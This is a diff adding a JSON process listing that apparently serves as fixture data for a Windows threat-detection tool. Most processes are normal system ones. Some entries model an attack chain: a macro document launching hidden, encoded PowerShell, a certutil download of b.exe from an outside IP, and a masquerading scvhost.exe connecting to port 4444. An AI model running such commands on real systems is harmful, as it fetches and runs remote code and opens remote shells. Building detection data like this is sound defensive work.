@@ -1,0 +1,122 @@
+[
+ {
+  "pid": 4,
+  "ppid": 0,
+  "name": "System",
+  "exe": "",
+  "cmdline": "",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "signature": "Valid"
+ },
+ {
+  "pid": 388,
+  "ppid": 4,
+  "name": "smss.exe",
+  "exe": "C:\\Windows\\System32\\smss.exe",
+  "cmdline": "",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "signature": "Valid",
+  "start_time": "2026-11-01T08:00:00+00:00"
+ },
+ {
+  "pid": 520,
+  "ppid": 388,
+  "name": "wininit.exe",
+  "exe": "C:\\Windows\\System32\\wininit.exe",
+  "cmdline": "wininit.exe",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "signature": "Valid",
+  "start_time": "2026-11-01T08:00:02+00:00"
+ },
+ {
+  "pid": 620,
+  "ppid": 520,
+  "name": "services.exe",
+  "exe": "C:\\Windows\\System32\\services.exe",
+  "cmdline": "C:\\Windows\\system32\\services.exe",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "signature": "Valid",
+  "start_time": "2026-11-01T08:00:03+00:00"
+ },
+ {
+  "pid": 632,
+  "ppid": 520,
+  "name": "lsass.exe",
+  "exe": "C:\\Windows\\System32\\lsass.exe",
+  "cmdline": "C:\\Windows\\system32\\lsass.exe",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "signature": "Valid",
+  "start_time": "2026-11-01T08:00:03+00:00"
+ },
+ {
+  "pid": 820,
+  "ppid": 620,
+  "name": "svchost.exe",
+  "exe": "C:\\Windows\\System32\\svchost.exe",
+  "cmdline": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "signature": "Valid",
+  "start_time": "2026-11-01T08:00:05+00:00"
+ },
+ {
+  "pid": 2110,
+  "ppid": 820,
+  "name": "explorer.exe",
+  "exe": "C:\\Windows\\explorer.exe",
+  "cmdline": "C:\\Windows\\Explorer.EXE",
+  "user": "CORP\\alice",
+  "signature": "Valid",
+  "start_time": "2026-11-01T08:05:00+00:00"
+ },
+ {
+  "pid": 4512,
+  "ppid": 2110,
+  "name": "svchost.exe",
+  "exe": "C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe",
+  "cmdline": "C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe",
+  "user": "CORP\\bob",
+  "signature": "NotSigned",
+  "start_time": "2026-11-03T09:14:22+00:00",
+  "sha256": "aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44"
+ },
+ {
+  "pid": 4600,
+  "ppid": 2110,
+  "name": "scvhost.exe",
+  "exe": "C:\\Users\\bob\\Downloads\\scvhost.exe",
+  "cmdline": "scvhost.exe -connect 185.220.101.47:4444",
+  "user": "CORP\\bob",
+  "signature": "NotSigned",
+  "start_time": "2026-11-03T09:15:00+00:00"
+ },
+ {
+  "pid": 4720,
+  "ppid": 2110,
+  "name": "WINWORD.EXE",
+  "exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+  "cmdline": "\"WINWORD.EXE\" /n invoice.docm",
+  "user": "CORP\\bob",
+  "signature": "Valid",
+  "start_time": "2026-11-03T09:13:50+00:00"
+ },
+ {
+  "pid": 4812,
+  "ppid": 4720,
+  "name": "powershell.exe",
+  "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "cmdline": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "user": "CORP\\bob",
+  "signature": "Valid",
+  "start_time": "2026-11-03T09:13:52+00:00"
+ },
+ {
+  "pid": 4900,
+  "ppid": 4812,
+  "name": "certutil.exe",
+  "exe": "C:\\Windows\\System32\\certutil.exe",
+  "cmdline": "certutil.exe -urlcache -split -f http://185.220.101.47/b.exe C:\\Users\\bob\\AppData\\Local\\Temp\\b.exe",
+  "user": "CORP\\bob",
+  "signature": "Valid",
+  "start_time": "2026-11-03T09:14:05+00:00"
+ }
+]
